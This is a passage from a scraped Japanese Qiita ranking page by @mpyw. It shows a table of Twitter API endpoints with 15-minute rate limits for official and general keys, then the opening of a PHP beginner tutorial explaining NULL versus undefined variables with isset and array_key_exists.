	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[Twitter]</b> <b>[TwitterAPI]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p><strong>15分</strong> あたりリクエスト可能な回数です。</p>

<table>
<thead>
<tr>
<th style="text-align: left"><strong>項目</strong></th>
<th style="text-align: right"><strong>公式キー</strong></th>
<th style="text-align: right"><strong>一般キー</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left">/account/login_verification_enrollment</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/account/personalization/download</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/account/personalization/p13n_data</td>
<td style="text-align: right">180</td>
<td style="text-align: right">180</td>
</tr>
<tr>
<td style="text-align: left">/account/personalization/p13n_preferences</td>
<td style="text-align: right">180</td>
<td style="text-align: right">180</td>
</tr>
<tr>
<td style="text-align: left">/account/personalization/partner_interests</td>
<td style="text-align: right">180</td>
<td style="text-align: right">180</td>
</tr>
<tr>
<td style="text-align: left">/account/personalization/set_optout_cookies</td>
<td style="text-align: right">180</td>
<td style="text-align: right">180</td>
</tr>
<tr>
<td style="text-align: left">/account/personalization/sync_optout_settings</td>
<td style="text-align: right">180</td>
<td style="text-align: right">180</td>
</tr>
<tr>
<td style="text-align: left">/account/personalization/twitter_interests</td>
<td style="text-align: right">180</td>
<td style="text-align: right">180</td>
</tr>
<tr>
<td style="text-align: left">/account/settings</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/account/update_profile</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/account/verify_credentials</td>
<td style="text-align: right">180</td>
<td style="text-align: right">75</td>
</tr>
<tr>
<td style="text-align: left">/account_activity/webhooks</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/account_activity/webhooks/:id/subscriptions</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/activity/about_me</td>
<td style="text-align: right">15</td>
<td style="text-align: right">0</td>
</tr>
<tr>
<td style="text-align: left">/activity/by_friends</td>
<td style="text-align: right">15</td>
<td style="text-align: right">0</td>
</tr>
<tr>
<td style="text-align: left">/application/rate_limit_status</td>
<td style="text-align: right">180</td>
<td style="text-align: right">180</td>
</tr>
<tr>
<td style="text-align: left">/auth/csrf_token</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/blocks/ids</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/blocks/list</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/business_experience/dashboard_features</td>
<td style="text-align: right">450</td>
<td style="text-align: right">450</td>
</tr>
<tr>
<td style="text-align: left">/business_experience/dashboard_settings/destroy</td>
<td style="text-align: right">450</td>
<td style="text-align: right">450</td>
</tr>
<tr>
<td style="text-align: left">/business_experience/dashboard_settings/show</td>
<td style="text-align: right">450</td>
<td style="text-align: right">450</td>
</tr>
<tr>
<td style="text-align: left">/business_experience/dashboard_settings/update</td>
<td style="text-align: right">450</td>
<td style="text-align: right">450</td>
</tr>
<tr>
<td style="text-align: left">/business_experience/keywords</td>
<td style="text-align: right">450</td>
<td style="text-align: right">450</td>
</tr>
<tr>
<td style="text-align: left">/collections/entries</td>
<td style="text-align: right">1000</td>
<td style="text-align: right">1000</td>
</tr>
<tr>
<td style="text-align: left">/collections/list</td>
<td style="text-align: right">1000</td>
<td style="text-align: right">1000</td>
</tr>
<tr>
<td style="text-align: left">/collections/show</td>
<td style="text-align: right">1000</td>
<td style="text-align: right">1000</td>
</tr>
<tr>
<td style="text-align: left">/contacts/addressbook</td>
<td style="text-align: right">300</td>
<td style="text-align: right">300</td>
</tr>
<tr>
<td style="text-align: left">/contacts/delete/status</td>
<td style="text-align: right">300</td>
<td style="text-align: right">300</td>
</tr>
<tr>
<td style="text-align: left">/contacts/uploaded_by</td>
<td style="text-align: right">300</td>
<td style="text-align: right">300</td>
</tr>
<tr>
<td style="text-align: left">/contacts/users</td>
<td style="text-align: right">300</td>
<td style="text-align: right">300</td>
</tr>
<tr>
<td style="text-align: left">/contacts/users_and_uploaded_by</td>
<td style="text-align: right">300</td>
<td style="text-align: right">300</td>
</tr>
<tr>
<td style="text-align: left">/conversation/show/:id</td>
<td style="text-align: right">180</td>
<td style="text-align: right">0</td>
</tr>
<tr>
<td style="text-align: left">/custom_profiles/list</td>
<td style="text-align: right">180</td>
<td style="text-align: right">180</td>
</tr>
<tr>
<td style="text-align: left">/custom_profiles/show</td>
<td style="text-align: right">180</td>
<td style="text-align: right">180</td>
</tr>
<tr>
<td style="text-align: left">/device/token</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/direct_messages</td>
<td style="text-align: right">300</td>
<td style="text-align: right">300</td>
</tr>
<tr>
<td style="text-align: left">/direct_messages/events/list</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/direct_messages/events/show</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/direct_messages/sent</td>
<td style="text-align: right">300</td>
<td style="text-align: right">300</td>
</tr>
<tr>
<td style="text-align: left">/direct_messages/sent_and_received</td>
<td style="text-align: right">300</td>
<td style="text-align: right">300</td>
</tr>
<tr>
<td style="text-align: left">/direct_messages/show</td>
<td style="text-align: right">300</td>
<td style="text-align: right">300</td>
</tr>
<tr>
<td style="text-align: left">/drafts/statuses/create</td>
<td style="text-align: right">450</td>
<td style="text-align: right">450</td>
</tr>
<tr>
<td style="text-align: left">/drafts/statuses/destroy</td>
<td style="text-align: right">450</td>
<td style="text-align: right">450</td>
</tr>
<tr>
<td style="text-align: left">/drafts/statuses/ids</td>
<td style="text-align: right">450</td>
<td style="text-align: right">450</td>
</tr>
<tr>
<td style="text-align: left">/drafts/statuses/list</td>
<td style="text-align: right">450</td>
<td style="text-align: right">450</td>
</tr>
<tr>
<td style="text-align: left">/drafts/statuses/show</td>
<td style="text-align: right">450</td>
<td style="text-align: right">450</td>
</tr>
<tr>
<td style="text-align: left">/drafts/statuses/update</td>
<td style="text-align: right">450</td>
<td style="text-align: right">450</td>
</tr>
<tr>
<td style="text-align: left">/favorites/list</td>
<td style="text-align: right">75</td>
<td style="text-align: right">75</td>
</tr>
<tr>
<td style="text-align: left">/feedback/events</td>
<td style="text-align: right">1000</td>
<td style="text-align: right">1000</td>
</tr>
<tr>
<td style="text-align: left">/feedback/show/:id</td>
<td style="text-align: right">180</td>
<td style="text-align: right">180</td>
</tr>
<tr>
<td style="text-align: left">/followers/ids</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/followers/list</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/friends/following/ids</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/friends/following/list</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/friends/ids</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/friends/list</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/friendships/incoming</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/friendships/list</td>
<td style="text-align: right">200</td>
<td style="text-align: right">200</td>
</tr>
<tr>
<td style="text-align: left">/friendships/lookup</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/friendships/no_retweets/ids</td>
<td style="text-align: right">60</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/friendships/outgoing</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/friendships/show</td>
<td style="text-align: right">180</td>
<td style="text-align: right">180</td>
</tr>
<tr>
<td style="text-align: left">/geo/id/:place_id</td>
<td style="text-align: right">75</td>
<td style="text-align: right">75</td>
</tr>
<tr>
<td style="text-align: left">/geo/reverse_geocode</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/geo/reverse_geocode/from_ip</td>
<td style="text-align: right">500000</td>
<td style="text-align: right">0</td>
</tr>
<tr>
<td style="text-align: left">/geo/search</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/geo/similar_places</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/help/configuration</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/help/languages</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/help/privacy</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/help/settings</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/help/tos</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/lists/list</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/lists/members</td>
<td style="text-align: right">900</td>
<td style="text-align: right">900</td>
</tr>
<tr>
<td style="text-align: left">/lists/members/show</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/lists/memberships</td>
<td style="text-align: right">75</td>
<td style="text-align: right">75</td>
</tr>
<tr>
<td style="text-align: left">/lists/ownerships</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/lists/show</td>
<td style="text-align: right">75</td>
<td style="text-align: right">75</td>
</tr>
<tr>
<td style="text-align: left">/lists/statuses</td>
<td style="text-align: right">900</td>
<td style="text-align: right">900</td>
</tr>
<tr>
<td style="text-align: left">/lists/subscribers</td>
<td style="text-align: right">180</td>
<td style="text-align: right">180</td>
</tr>
<tr>
<td style="text-align: left">/lists/subscribers/show</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/lists/subscriptions</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/live_pipeline/events</td>
<td style="text-align: right">180</td>
<td style="text-align: right">180</td>
</tr>
<tr>
<td style="text-align: left">/live_video_stream/status/:id</td>
<td style="text-align: right">1000</td>
<td style="text-align: right">1000</td>
</tr>
<tr>
<td style="text-align: left">/media/upload</td>
<td style="text-align: right">500</td>
<td style="text-align: right">500</td>
</tr>
<tr>
<td style="text-align: left">/moments/permissions</td>
<td style="text-align: right">300</td>
<td style="text-align: right">300</td>
</tr>
<tr>
<td style="text-align: left">/mutes/users/ids</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/mutes/users/list</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/saved_searches/destroy/:id</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/saved_searches/list</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/saved_searches/show/:id</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/search/integrated</td>
<td style="text-align: right">180</td>
<td style="text-align: right">0</td>
</tr>
<tr>
<td style="text-align: left">/search/tweets</td>
<td style="text-align: right">180</td>
<td style="text-align: right">180</td>
</tr>
<tr>
<td style="text-align: left">/search/universal</td>
<td style="text-align: right">180</td>
<td style="text-align: right">0</td>
</tr>
<tr>
<td style="text-align: left">/statuses/:id/activity</td>
<td style="text-align: right">15</td>
<td style="text-align: right">0</td>
</tr>
<tr>
<td style="text-align: left">/statuses/:id/activity_summary</td>
<td style="text-align: right">15</td>
<td style="text-align: right">0</td>
</tr>
<tr>
<td style="text-align: left">/statuses/friends</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/statuses/home_timeline</td>
<td style="text-align: right">180</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/statuses/lookup</td>
<td style="text-align: right">900</td>
<td style="text-align: right">900</td>
</tr>
<tr>
<td style="text-align: left">/statuses/media_timeline</td>
<td style="text-align: right">15</td>
<td style="text-align: right">0</td>
</tr>
<tr>
<td style="text-align: left">/statuses/mentions_timeline</td>
<td style="text-align: right">180</td>
<td style="text-align: right">75</td>
</tr>
<tr>
<td style="text-align: left">/statuses/oembed</td>
<td style="text-align: right">180</td>
<td style="text-align: right">180</td>
</tr>
<tr>
<td style="text-align: left">/statuses/retweeters/ids</td>
<td style="text-align: right">75</td>
<td style="text-align: right">75</td>
</tr>
<tr>
<td style="text-align: left">/statuses/retweets/:id</td>
<td style="text-align: right">75</td>
<td style="text-align: right">75</td>
</tr>
<tr>
<td style="text-align: left">/statuses/retweets_of_me</td>
<td style="text-align: right">75</td>
<td style="text-align: right">75</td>
</tr>
<tr>
<td style="text-align: left">/statuses/show/:id</td>
<td style="text-align: right">900</td>
<td style="text-align: right">900</td>
</tr>
<tr>
<td style="text-align: left">/statuses/user_timeline</td>
<td style="text-align: right">900</td>
<td style="text-align: right">900</td>
</tr>
<tr>
<td style="text-align: left">/translations/show</td>
<td style="text-align: right">90</td>
<td style="text-align: right">0</td>
</tr>
<tr>
<td style="text-align: left">/trends/available</td>
<td style="text-align: right">75</td>
<td style="text-align: right">75</td>
</tr>
<tr>
<td style="text-align: left">/trends/closest</td>
<td style="text-align: right">75</td>
<td style="text-align: right">75</td>
</tr>
<tr>
<td style="text-align: left">/trends/personalized</td>
<td style="text-align: right">15</td>
<td style="text-align: right">0</td>
</tr>
<tr>
<td style="text-align: left">/trends/place</td>
<td style="text-align: right">75</td>
<td style="text-align: right">75</td>
</tr>
<tr>
<td style="text-align: left">/tweet_prompts/report_interaction</td>
<td style="text-align: right">180</td>
<td style="text-align: right">180</td>
</tr>
<tr>
<td style="text-align: left">/tweet_prompts/show</td>
<td style="text-align: right">180</td>
<td style="text-align: right">180</td>
</tr>
<tr>
<td style="text-align: left">/users/contributees</td>
<td style="text-align: right">15</td>
<td style="text-align: right">0</td>
</tr>
<tr>
<td style="text-align: left">/users/contributors</td>
<td style="text-align: right">15</td>
<td style="text-align: right">0</td>
</tr>
<tr>
<td style="text-align: left">/users/derived_info</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/users/lookup</td>
<td style="text-align: right">900</td>
<td style="text-align: right">900</td>
</tr>
<tr>
<td style="text-align: left">/users/profile_banner</td>
<td style="text-align: right">180</td>
<td style="text-align: right">180</td>
</tr>
<tr>
<td style="text-align: left">/users/recommendations</td>
<td style="text-align: right">15</td>
<td style="text-align: right">0</td>
</tr>
<tr>
<td style="text-align: left">/users/recommendations/show</td>
<td style="text-align: right">15</td>
<td style="text-align: right">0</td>
</tr>
<tr>
<td style="text-align: left">/users/report_spam</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/users/search</td>
<td style="text-align: right">900</td>
<td style="text-align: right">900</td>
</tr>
<tr>
<td style="text-align: left">/users/show/:id</td>
<td style="text-align: right">900</td>
<td style="text-align: right">900</td>
</tr>
<tr>
<td style="text-align: left">/users/suggestions</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/users/suggestions/:slug</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/users/suggestions/:slug/members</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/webhooks</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
<tr>
<td style="text-align: left">/webhooks/subscriptions/direct_messages</td>
<td style="text-align: right">15</td>
<td style="text-align: right">15</td>
</tr>
</tbody>
</table>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />20位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>65</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/0a4ea0bc9a695da33f0c">【PHP入門講座】 NULLと未定義の違い</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-11-30 18:33:55</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> <b>[PHP入門講座]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h3>
<span id="目次に戻る" class="fragment"></span><a href="#%E7%9B%AE%E6%AC%A1%E3%81%AB%E6%88%BB%E3%82%8B"><i class="fa fa-link"></i></a><a href="http://qiita.com/mpyw/items/752e19a578cf7d96fc5f" id="reference-422a3673c88c926cf285">目次に戻る</a>
</h3>

<h1>
<span id="nullと未定義" class="fragment"></span><a href="#null%E3%81%A8%E6%9C%AA%E5%AE%9A%E7%BE%A9"><i class="fa fa-link"></i></a>NULLと未定義</h1>

<h2>
<span id="null型" class="fragment"></span><a href="#null%E5%9E%8B"><i class="fa fa-link"></i></a>NULL型</h2>

<p><strong>NULL</strong> という型があります。PHPでは <code>null</code> と書きます。大文字小文字は区別されません。以下のコードを実行してみましょう。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$var</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$var</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>NULL
</pre></div>
</div>

<p><code>TRUE</code> <code>FALSE</code> <code>NULL</code> をまとめて <strong>三値</strong> と呼ぶことがありますが、これらを漢字一文字で表すと</p>

<ul>
<li>
<code>TRUE</code> … 真</li>
<li>
<code>FALSE</code> … 偽</li>
<li><strong><code>NULL</code> … 無</strong></li>
</ul>

<p>として解釈されます。命題「今日は学校に行く日か？」で例えると、</p>

<ul>
<li>
<code>TRUE</code> …今日は学校に行く日である</li>
<li>
<code>FALSE</code> … 今日は休みの日である</li>
<li><strong><code>NULL</code> … そもそも中退してた</strong></li>
</ul>

<p>のようなイメージです。</p>

<h2>
<span id="未定義undefined" class="fragment"></span><a href="#%E6%9C%AA%E5%AE%9A%E7%BE%A9undefined"><i class="fa fa-link"></i></a>未定義(Undefined)</h2>

<p><code>NULL</code> は <strong>無</strong> と言いながらも…</p>

<blockquote>
<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$var</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$var</span><span class="p">);</span>
</pre></div>
</div>
</blockquote>

<p>確かにこの例では<ins>変数 <code>$var</code> は値 <code>NULL</code> を持つものとして存在</ins>していました。ここで別の例を考えてみましょう。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$var</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>PHP Notice:  Undefined variable: var in ...
NULL
</pre></div>
</div>

<p><strong>「変数varが未定義だよ！」</strong> という <strong>Notice</strong> を発生しながらも、何故か <code>NULL</code> と表示されていますね。PHPでは、<ins>未定義の値を取得しようとしたときに、Noticeを発生しながら <code>NULL</code> を代わりに取得します</ins>。</p>

<p>また、配列において未定義のキーから値を取得しようとしたときにも、エラーメッセージは微妙に違いますが同様のNoticeが発生します。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$var</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'A'</span><span class="p">,</span> <span class="s1">'B'</span><span class="p">);</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$var</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nv">$var</span><span class="p">[</span><span class="s1">'foo'</span><span class="p">]);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>PHP Notice:  Undefined offset: 2 in ...
NULL
PHP Notice:  Undefined index: foo in ...
NULL
</pre></div>
</div>

<p>PHPプログラマは、</p>

<ul>
<li>Noticeを気にせずに手抜きコーディングをする人</li>
<li><strong>Noticeの発生に気を付けて丁寧にコーディングする人</strong></li>
</ul>

<p>に大分されると思いますが、もちろんここでは後者を目指してコーディングを行っていきます。<ins>Noticeが発生するだけで処理速度が大幅に低下</ins>するので、これを潰すメリットはかなり大きいです。</p>

<h1>
<span id="noticeを出さずに未定義をチェックする方法" class="fragment"></span><a href="#notice%E3%82%92%E5%87%BA%E3%81%95%E3%81%9A%E3%81%AB%E6%9C%AA%E5%AE%9A%E7%BE%A9%E3%82%92%E3%83%81%E3%82%A7%E3%83%83%E3%82%AF%E3%81%99%E3%82%8B%E6%96%B9%E6%B3%95"><i class="fa fa-link"></i></a>Noticeを出さずに未定義をチェックする方法</h1>

<p>ここからは少し復習も入ります。</p>

<p><strong>【PHP入門講座】 想定外の入力への対応</strong><br>
<a href="http://qiita.com/mpyw/items/f298828002bbc488fe89" class="autolink" id="reference-89bae3b9d1963a46fcf6">http://qiita.com/mpyw/items/f298828002bbc488fe89</a></p>

<p>こちらで既に少し触れていますが、 <strong><code>isset</code></strong> 構文を用いる方法があります。 <code>isset</code> は関数ではなく言語構文であるが故に、<ins>未定義の変数から値を取得しようとしてもNoticeを発生しない</ins>という強力な特長を持っています。</p>

<h2>
<span id="isset-が真を返す条件" class="fragment"></span><a href="#isset-%E3%81%8C%E7%9C%9F%E3%82%92%E8%BF%94%E3%81%99%E6%9D%A1%E4%BB%B6"><i class="fa fa-link"></i></a><code>isset</code> が真を返す条件</h2>

<h3>
<span id="通常の変数" class="fragment"></span><a href="#%E9%80%9A%E5%B8%B8%E3%81%AE%E5%A4%89%E6%95%B0"><i class="fa fa-link"></i></a>通常の変数</h3>

<ul>
<li>変数が <strong>定義</strong> されている</li>
<li>且つ、 <strong><code>NULL</code> 以外</strong> の値を取る</li>
</ul>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$v2</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
<span class="nv">$v3</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$v1</span><span class="p">),</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$v2</span><span class="p">),</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$v3</span><span class="p">));</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>bool(false)
bool(false)
bool(true)
</pre></div>
</div>

<h3>
<span id="配列のキー" class="fragment"></span><a href="#%E9%85%8D%E5%88%97%E3%81%AE%E3%82%AD%E3%83%BC"><i class="fa fa-link"></i></a>配列のキー</h3>

<ul>
<li>キーが <strong>定義</strong> されている</li>
<li>且つ、 <strong><code>NULL</code> 以外</strong> の値を取る</li>
</ul>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$v</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="nv">$v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
<span class="nv">$v</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$v</span><span class="p">[</span><span class="mi">0</span><span class="p">]),</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$v</span><span class="p">[</span><span class="mi">1</span><span class="p">]),</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$v</span><span class="p">[</span><span class="mi">2</span><span class="p">]));</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>bool(false)
bool(false)
bool(true)
</pre></div>
</div>

<h2>
<span id="null-と未定義を区別する方法" class="fragment"></span><a href="#null-%E3%81%A8%E6%9C%AA%E5%AE%9A%E7%BE%A9%E3%82%92%E5%8C%BA%E5%88%A5%E3%81%99%E3%82%8B%E6%96%B9%E6%B3%95"><i class="fa fa-link"></i></a><code>NULL</code> と未定義を区別する方法</h2>

<p>まず真っ先に思いつくのは、値を取得しようとしてみてエラーが発生したかどうかをチェックする、という方法でしょう。しかし、これにはいろいろ制約が多く、現実的な方法ではありません。そこで別の方法を考えてみましょう。</p>

<h3>
<span id="配列におけるキーが存在するかどうか" class="fragment"></span><a href="#%E9%85%8D%E5%88%97%E3%81%AB%E3%81%8A%E3%81%91%E3%82%8B%E3%82%AD%E3%83%BC%E3%81%8C%E5%AD%98%E5%9C%A8%E3%81%99%E3%82%8B%E3%81%8B%E3%81%A9%E3%81%86%E3%81%8B"><i class="fa fa-link"></i></a>配列におけるキーが存在するかどうか</h3>

<p><strong><code>array_key_exists</code></strong> 関数を利用します。これは、キーが定義されているときに必ず <code>TRUE</code> を返します。 <ins><code>NULL</code> でも <code>TRUE</code> となります。</ins>これが <code>isset</code> 構文との大きな違いです。</p>

<p><strong>array_key_exists</strong><br>
<a href="http://php.net/manual/ja/function.array-key-exists.php" class="autolink" rel="nofollow noopener" target="_blank">http://php.net/manual/ja/function.array-key-exists.php</a></p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$v</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="nv">$v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
<span class="nv">$v</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
<span class="nb">var_dump</span><span class="p">(</span>
    <span class="nb">array_key_exists</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nv">$v</span><span class="p">),</span>
    <span class="nb">array_key_exists</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nv">$v</span><span class="p">),</span>
    <span class="nb">array_key_exists</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="nv">$v</span><span class="p">)</span>
<span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>bool(false)
bool(true)
bool(true)
</pre></div>
</div>

<h3>
<span id="グローバル空間における変数が存在するかどうか" class="fragment"></span><a href="#%E3%82%B0%E3%83%AD%E3%83%BC%E3%83%90%E3%83%AB%E7%A9%BA%E9%96%93%E3%81%AB%E3%81%8A%E3%81%91%E3%82%8B%E5%A4%89%E6%95%B0%E3%81%8C%E5%AD%98%E5%9C%A8%E3%81%99%E3%82%8B%E3%81%8B%E3%81%A9%E3%81%86%E3%81%8B"><i class="fa fa-link"></i></a>グローバル空間における変数が存在するかどうか</h3>

<p><strong>グローバル空間</strong> とは、関数内ではない、要するに <strong>一番外側の空間</strong> を指します。今まで扱ってきた場所はほとんどグローバル空間です。グローバル空間にある変数は <strong>グローバル変数</strong> といいます。</p>

